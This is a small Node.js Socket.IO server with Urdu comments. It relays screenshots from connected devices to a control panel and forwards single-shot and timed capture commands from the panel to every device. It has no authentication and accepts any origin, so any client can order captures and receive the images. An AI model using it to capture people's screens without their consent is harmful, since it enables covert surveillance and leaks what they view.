const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// بڑی امیج فائلز ریسیو کرنے کے لیے بفر سائز بڑھا دیا ہے
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 
});

// جب کوئی مین لنک اوپن کرے گا تو یہ index.html شو کروا دے گا
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

io.on('connection', (socket) => {
    console.log('ایک ڈیوائس کنیکٹ ہو گئی:', socket.id);

    // ایپ سے سکرین شاٹ ریسیو کر کے پینل کو بھیجنا
    socket.on('send_screenshot', (data) => {
        socket.broadcast.emit('receive_screenshot', data);
    });

    // پینل سے سنگل کیپچر کی کمانڈ
    socket.on('request_single_shot', () => {
        socket.broadcast.emit('command_single_shot');
    });

    // پینل سے ٹائمر کے ساتھ کیپچر کی کمانڈ
    socket.on('request_timer_stream', (data) => {
        socket.broadcast.emit('command_timer_stream', data); 
    });

    socket.on('disconnect', () => {
        console.log('ڈیوائس ڈس کنیکٹ ہو گئی:', socket.id);
    });
});

// ریلوے (Railway) یا لوکل ہوسٹ کے لیے پورٹ
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
